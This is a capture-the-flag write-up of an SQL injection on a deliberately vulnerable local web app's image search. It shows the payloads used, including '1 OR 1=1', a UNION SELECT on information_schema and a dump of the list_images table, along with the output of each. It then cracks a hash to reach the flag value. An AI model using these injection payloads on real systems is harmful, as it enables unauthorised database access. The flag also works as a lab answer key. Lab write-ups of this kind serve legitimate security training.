Going to the search image page http://localhost:8080/index.php?page=searchimg we find an input field that we are going to test.

Let's try doing the same process as our previous SQL Injection with `1 OR 1=1`:

```
ID: 1 OR 1=1 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 OR 1=1 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 1 OR 1=1 
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 1 OR 1=1 
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 1 OR 1=1 
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

Now let's retrieve the columns with `1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --`:

```
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() -- 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() -- 
Title: id
Url : list_images

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() -- 
Title: url
Url : list_images

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() -- 
Title: title
Url : list_images

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() -- 
Title: comment
Url : list_images
```

Now we know that in the `list_images` table there are 4 columns `id`, `url`, `title`, `comment`.
Let's check what's inside the `title` and `comment` columns `1 UNION SELECT title, comment FROM list_images --`:

```
ID: 1 UNION SELECT title, comment FROM list_images -- 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 UNION SELECT title, comment FROM list_images -- 
Title: An image about the NSA !
Url : Nsa

ID: 1 UNION SELECT title, comment FROM list_images -- 
Title: There is a number..
Url : 42 !

ID: 1 UNION SELECT title, comment FROM list_images -- 
Title: Google it !
Url : Google

ID: 1 UNION SELECT title, comment FROM list_images -- 
Title: Earth!
Url : Earth

ID: 1 UNION SELECT title, comment FROM list_images -- 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

Let's follow the instructions just found:
 - `1928e8083cf461a51303633093573c46` decrypted -> `albatroz`
 - SH256 -> `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

To remediate this vulnerability, the application should follow the same ideas as stated in the other SQL Injection.